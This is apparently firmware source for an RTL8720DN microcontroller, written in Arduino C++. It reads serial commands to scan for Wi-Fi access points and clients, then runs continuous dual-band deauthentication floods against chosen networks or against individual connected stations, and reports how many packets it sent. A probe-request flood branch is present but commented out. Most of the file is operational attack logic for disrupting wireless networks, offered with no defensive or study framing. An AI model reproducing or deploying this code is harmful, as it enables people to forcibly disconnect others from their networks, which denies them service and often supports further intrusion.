#include "src/wifi_frame_tx.h"
#include "src/communication.h"
#include "src/utils.h"
#include "src/wififunc.h"
#include "wifi_drv.h"
#include "LinkedList.h"

// RTL8720DN

LinkedList<BssidToDeauth>* bssid_to_deauth_list;
LinkedList<BssidToDeauthWithStaion>* bssid_to_deauth_with_station_list;

void setup() {
    Serial.begin(115200);
    delay(100);
    pinMode(LED_R, OUTPUT);
    pinMode(LED_G, OUTPUT);
    pinMode(LED_B, OUTPUT);
    bssid_to_deauth_list = new LinkedList<BssidToDeauth>();
    bssid_to_deauth_with_station_list = new LinkedList<BssidToDeauthWithStaion>();
}

bool ap_scan = false;
bool ap_sta_scan = false;
bool broadcast_deauth_attack = false;
bool sta_deauth_attack = false;
bool auth_attack = false;

String ssid_to_probe_req = "";
uint8_t channel = 1;
static uint16_t packet_sent = 0;

void loop() {
    String command = readMasterResponse();

    if (command.length() > 0) {
        if (command == "RTL_READY") Serial.println("RTL_READY");
        else if (command == "RTL_STOP_SCAN") {
            bssid_to_deauth_list->clear();
            bssid_to_deauth_with_station_list->clear();

            ap_scan = false;
            ap_sta_scan = false;

            broadcast_deauth_attack = false;
            sta_deauth_attack = false;
            auth_attack = false;

            digitalWrite(LED_R, LOW);
            digitalWrite(LED_G, LOW);
            digitalWrite(LED_B, LOW);

            wifi_off();
            wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 1);
        }
        else if (command == "RTL_START_AP_SCAN") {
            digitalWrite(LED_G, HIGH);
            ap_scan = true;
            band5ghz_scan = false;
            channel = 1;

            //LwIP_Init();
            wifi_on(RTW_MODE_STA);

            wifi_enter_promisc_mode();
            wifi_set_promisc(RTW_PROMISC_ENABLE_2, rtl_ap_sniffer_callback, 1);
        }
        else if (command == "RTL_START_AP_STA_SCAN") {
            digitalWrite(LED_B, HIGH);
            ap_sta_scan = true;
            band5ghz_scan = false;
            channel = 1;

            //LwIP_Init();
            wifi_on(RTW_MODE_STA);

            wifi_enter_promisc_mode();
            wifi_set_promisc(RTW_PROMISC_ENABLE_2, rtl_ap_sta_sniffer_callback, 1);
        }
        else if (command.startsWith("RTL_DEAUTH_STA")) {
            // RTL_DEAUTH_STA -am {<AP_MAC_ADDRESS>} -sm {<STA_MAC_ADDRESS>} -c <CHANNEL>
            int am_index = command.indexOf("-am ");
            int sm_index = command.indexOf("-sm ");
            int c_index = command.indexOf("-c ");

            if (am_index < 0 || sm_index < 0 || c_index < 0) {
                Serial.println("ERROR: Missing required arguments");
                return;
            }

            // Parse src_macs: -am {mac1,mac2,...}
            int src_start = command.indexOf("{", am_index) + 1;
            int src_end = command.indexOf("}", am_index);
            String src_macs_str = command.substring(src_start, src_end);

            // Parse channels: -c {ch1,ch2,...}
            int ch_start = command.indexOf("{", c_index) + 1;
            int ch_end = command.indexOf("}", c_index);
            String channels_str = command.substring(ch_start, ch_end);

            // Parse dst_groups: -sm {mac1,mac2},{mac3,mac4},{mac5}
            String dst_groups_str = command.substring(sm_index + 4, c_index - 1);
            dst_groups_str.trim();

            // Split src_macs và channels
            std::vector<String> src_macs;
            std::vector<String> channels;
            
            int src_count = splitStringToVector(src_macs_str, ',', src_macs);
            int ch_count = splitStringToVector(channels_str, ',', channels);

            // Clear existing list
            if (bssid_to_deauth_with_station_list != nullptr) {
                bssid_to_deauth_with_station_list->clear();
            }

            // Parse dst_groups: {group1},{group2},{group3},...
            int group_count = 0;
            int pos = 0;
            
            while (pos < dst_groups_str.length() && group_count < src_count) {
                int group_start = dst_groups_str.indexOf('{', pos);
                if (group_start == -1) break;
                
                int group_end = dst_groups_str.indexOf('}', group_start);
                if (group_end == -1) break;
                
                String group_str = dst_groups_str.substring(group_start + 1, group_end);
                group_str.trim();

                BssidToDeauthWithStaion btdws;
                
                // Parse AP MAC
                uint8_t src_mac[6];
                String str_src_mac = src_macs[group_count];
                if (!stringToMac(str_src_mac, src_mac)) {
                    group_count++;
                    pos = group_end + 1;
                    continue;
                }
                memcpy(btdws.bssid, src_mac, 6);
                
                // Parse channel
                int channelIndex = group_count < ch_count ? group_count : ch_count - 1;
                btdws.channel = channels[channelIndex].toInt();
                
                // Initialize station list
                btdws.stations = new LinkedList<Station>();
                
                // Parse stations trong group này
                if (group_str.length() > 0) {
                    std::vector<String> sta_macs;
                    int sta_count = splitStringToVector(group_str, ',', sta_macs);
                    
                    
                    for (int i = 0; i < sta_count; i++) {
                        uint8_t sta_mac[6];
                        if (stringToMac(sta_macs[i], sta_mac)) {
                            Station sta;
                            memcpy(sta.mac, sta_mac, 6);
                            btdws.stations->add(sta);
                        } else {
                        }
                    }
                }
                
                // Add to list
                bssid_to_deauth_with_station_list->add(btdws);
                
                group_count++;
                pos = group_end + 1;
                
                // Skip comma và spaces
                while (pos < dst_groups_str.length()) {
                    char c = dst_groups_str.charAt(pos);
                    if (c == ',' || c == ' ' || c == '\t') {
                        pos++;
                    } else {
                        break;
                    }
                }
            }
            digitalWrite(LED_R, HIGH);
            wifi_on(RTW_MODE_AP);
            sta_deauth_attack = true;
        }
        else if (command.startsWith("RTL_DEAUTH")) {
            // RTL_DEAUTH -am {<MAC_ADDRESS>} -c {<CHANNEL>}
            int am_arg_index = command.indexOf("-am ");
            int c_arg_index = command.indexOf("-c ");

            if (am_arg_index > 0 && c_arg_index > 0) {
                // Parse src_macs
                int src_start = command.indexOf("{", am_arg_index) + 1;
                int src_end = command.indexOf("}", am_arg_index);
                String src_macs_str = command.substring(src_start, src_end);
                
                // Parse channels
                int ch_start = command.indexOf("{", c_arg_index) + 1;
                int ch_end = command.indexOf("}", c_arg_index);
                String channels_str = command.substring(ch_start, ch_end);

                std::vector<String> src_macs;
                std::vector<String> channels;
                
                // Split and process
                int src_count = splitStringToVector(src_macs_str, ',', src_macs);
                int ch_count = splitStringToVector(channels_str, ',', channels);
                
                for (int i = 0; i < src_count && i < ch_count; i++) {
                    uint8_t src_mac[6];
                    stringToMac(src_macs[i], src_mac);
                    int channel = channels[i].toInt();

                    BssidToDeauth btd;
                    memcpy(btd.bssid, src_mac, 6);
                    btd.channel = channel;
                    bssid_to_deauth_list->add(btd);
                }
                
                digitalWrite(LED_R, HIGH);
                wifi_on(RTW_MODE_AP);
                broadcast_deauth_attack = true;
            }
        }
        /*
        else if (command.startsWith("RTL_START_AUTH_ATTACK")) {
            // RTL_START_AUTH_ATTACK -s <SSID> -c <CHANNEL>
            int s_arg_index = command.indexOf("-s ");
            int c_arg_index = command.indexOf("-c ");

            if (s_arg_index > 0 && c_arg_index > 0) {
                ssid_to_probe_req = command.substring(s_arg_index + 3, c_arg_index - 1);
                String channel_str = command.substring(c_arg_index + 3);

                channel = channel_str.toInt();

                digitalWrite(LED_R, HIGH);
                auth_attack = true;
            }
        }
        */
    }

    if (ap_scan || ap_sta_scan) {
        channelHop();
    }
    else if (broadcast_deauth_attack) {
        for (int i = 0; i < bssid_to_deauth_list->size(); i++) {
            sendDualBandDeauthFrame(bssid_to_deauth_list->get(i).bssid, bssid_to_deauth_list->get(i).channel);
            packet_sent = packet_sent + 6;
            delay(1);
        }
        static unsigned long initTime = millis();
        if (millis() - initTime > 1000) {
            initTime = millis();
            Serial.println("PACKET:" + String(packet_sent));
            packet_sent = 0;
        }
    }
    else if (sta_deauth_attack) {
        for (int i = 0; i < bssid_to_deauth_with_station_list->size(); i++) {
            BssidToDeauthWithStaion btdws = bssid_to_deauth_with_station_list->get(i);
            for (int j = 0; j < btdws.stations->size(); j++) {
                Station sta = btdws.stations->get(j);
                sendDualBandDeauthFrame(btdws.bssid, btdws.channel, sta.mac);
                packet_sent = packet_sent + 6;
                delay(1);
            }
        }
        static unsigned long initTime = millis();
        if (millis() - initTime > 1000) {
            initTime = millis();
            Serial.println("PACKET:" + String(packet_sent));
            packet_sent = 0;
        }
    }
    else if (auth_attack) {
        sendDualBandProbeReqFrame(ssid_to_probe_req, channel);
        delay(1);
    }
}